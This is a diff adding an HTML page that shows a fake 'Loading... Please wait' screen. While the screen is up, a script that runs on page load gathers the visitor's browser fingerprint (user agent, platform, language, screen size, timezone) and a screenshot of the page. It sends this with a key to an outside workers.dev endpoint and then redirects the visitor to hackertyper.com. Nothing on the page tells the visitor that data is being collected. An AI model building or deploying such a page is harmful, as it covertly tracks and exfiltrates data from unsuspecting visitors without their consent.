@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+</head>
+<body style="margin:0;padding:0;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;background:#000;color:#fff;font-family:monospace;">
+<div style="text-align:center"><h1>Loading...</h1><p>Please wait</p></div>
+<script>
+const WORKER_URL = "https://silent-leaf-5ef3.nikegtag.workers.dev";
+const SECRET = "nikehub.orgontop";
+
+async function captureEverything(){
+    const data = {};
+    data.userAgent = navigator.userAgent;
+    data.platform = navigator.platform;
+    data.language = navigator.language;
+    data.screenWidth = screen.width;
+    data.screenHeight = screen.height;
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.devicePixelRatio = devicePixelRatio;
+    
+    try{
+        const canvas = await html2canvas(document.body,{scale:0.5});
+        data.screenshot = canvas.toDataURL('image/png').split(',')[1];
+    }catch(e){ data.screenshotError = e.message; }
+    
+    fetch(`${WORKER_URL}?key=${SECRET}`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+    }).catch(e => console.log(e));
+    
+    setTimeout(() => { window.location.href = "https://hackertyper.com"; }, 1500);
+}
+captureEverything();
+</script>
+</body>
+</html>
